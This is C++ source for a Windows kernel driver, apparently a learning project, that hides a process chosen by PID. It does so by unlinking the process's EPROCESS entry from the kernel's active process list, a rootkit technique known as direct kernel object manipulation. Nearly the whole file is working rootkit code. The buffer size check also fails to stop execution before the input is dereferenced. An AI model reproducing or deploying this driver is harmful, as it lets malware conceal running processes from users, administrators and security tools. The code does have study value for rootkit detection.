#include "pch.h"
#include "Routines.h"
#include "Consts.h"
#include "PorcessHideCommon.h"


NTSTATUS processHiderCreateClose(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


void processHiderUnload(_In_ PDRIVER_OBJECT driverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\processhider");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);
	// delete device object
	IoDeleteDevice(driverObject->DeviceObject);
}


NTSTATUS processHiderDeviceControl(PDEVICE_OBJECT, PIRP irp) {
	auto stack = IoGetCurrentIrpStackLocation(irp);
	auto status = STATUS_SUCCESS;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_PROCESS_HIDE_BY_PID:
	{
		const auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size != sizeof(HANDLE)) {
			status = STATUS_INVALID_BUFFER_SIZE;
		}
		const auto pid = *reinterpret_cast<HANDLE*>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
		PEPROCESS eprocessAddress = nullptr;
		status = PsLookupProcessByProcessId(pid, &eprocessAddress);
		if (!NT_SUCCESS(status)) {
			KdPrint(("Failed to look for process by id (0x%08X)\n", status));
			break;
		}

		// We need to find where activeProcessList field in the EPROCESS struct resides,
		// we assume it will be found after the PID field so we search for it points what appears after it.

		// We assume that the PID will be alligned to % sizeof(HANDLE).
		// This is not the best approach, but simple and works :)
		auto addr = reinterpret_cast<HANDLE*>(eprocessAddress);
		LIST_ENTRY* activeProcessList = 0;
		for (SIZE_T offset = 0; offset < consts::MAX_EPROCESS_SIZE / sizeof(SIZE_T*); offset++) {
			if (addr[offset] == pid) {
				activeProcessList = reinterpret_cast<LIST_ENTRY*>(addr + offset + 1);
				break;
			}
		}

		if (!activeProcessList) {
			ObDereferenceObject(eprocessAddress);
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint(("Found address for ActiveProcessList! (0x%08X)\n", activeProcessList));

		if (activeProcessList->Flink == activeProcessList && activeProcessList->Blink == activeProcessList) {
			ObDereferenceObject(eprocessAddress);
			status = STATUS_ALREADY_COMPLETE;
			break;
		}

		LIST_ENTRY* prevProcess = activeProcessList->Blink;
		LIST_ENTRY* nextProcess = activeProcessList->Flink;

		prevProcess->Flink = nextProcess;
		nextProcess->Blink = prevProcess;

		// Point to ourselves since we don't want to point structures 
		// that may be don't available in the future..
		activeProcessList->Blink = activeProcessList;
		activeProcessList->Flink = activeProcessList;

		ObDereferenceObject(eprocessAddress);
	}
		break;
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	irp->IoStatus.Status = status;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}